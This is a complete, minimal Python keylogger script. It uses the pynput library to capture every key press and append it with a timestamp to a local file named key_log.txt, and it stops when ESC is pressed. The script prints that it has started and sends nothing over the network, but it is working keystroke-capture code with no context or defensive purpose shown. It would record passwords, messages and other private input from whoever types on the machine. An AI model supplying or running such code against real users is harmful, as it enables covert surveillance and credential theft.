from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_pressed = key.char
    except AttributeError:
        key_pressed = str(key)

    log_entry = f"[{current_time}] {key_pressed}\n"

    with open(log_file, "a") as file:
        file.write(log_entry)

    if key == keyboard.Key.esc:
        print("ESC pressed, exiting...")
        return False

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
